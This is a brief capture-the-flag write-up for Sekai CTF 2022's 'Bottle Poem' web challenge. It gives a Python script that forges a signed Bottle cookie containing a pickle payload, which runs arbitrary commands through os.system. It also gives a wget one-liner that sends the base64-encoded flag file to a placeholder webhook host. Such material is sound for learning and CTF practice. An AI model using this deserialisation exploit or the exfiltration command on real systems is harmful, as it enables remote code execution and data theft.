This one was a copied challenge from Sekai CTF (Bottle Poem).

Solution:
https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/bottle-poem/solution

Script to get RCE:
```
#!/usr/bin/env python3

from bottle import response
import sys

command = sys.argv[1]

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

response.set_cookie('name', {'name': 'admin', 'v': PickleRce()}, secret="trrrrrrrrrrrrryyyyyyyyyyyharddddddddd")
print(f'Cookie: {response.headerlist[1][1]}')
```

To get flag:
`python3 solution-poems.py 'wget webhooklinkhere/?c=`/flag|base64`'`
